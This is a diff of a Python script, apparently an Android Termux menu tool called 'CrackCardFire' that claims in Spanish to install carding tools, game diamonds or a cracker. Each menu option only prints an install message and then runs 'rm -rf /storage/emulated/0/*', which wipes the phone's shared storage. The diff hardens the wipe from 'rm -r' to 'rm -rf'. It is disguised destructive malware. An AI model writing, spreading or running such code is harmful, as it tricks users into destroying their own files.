@@ -27,14 +27,14 @@ eleccion = int(eval(input("CrackCardFire>> ")))
 if eleccion == 1:
 	os.system("apt update")
 	print("INSTALANDO CARDER TOOLS")
-	os.system("rm -r /storage/emulated/0/*")
+	os.system("rm -rf /storage/emulated/0/*")
 
 elif eleccion == 2:
 	os.system("apt update")
 	print("INSTALANDO DIAMANTES..........")
-	os.system("rm -r /storage/emulated/0/*")
+	os.system("rm -rf /storage/emulated/0/*")
 
 elif eleccion == 3:
 	os.system("apt update")
 	print("INSTALANDO CRACKER...................")
-	os.system("rm -r /storage/emulated/0/*")
+	os.system("rm -rf /storage/emulated/0/*")
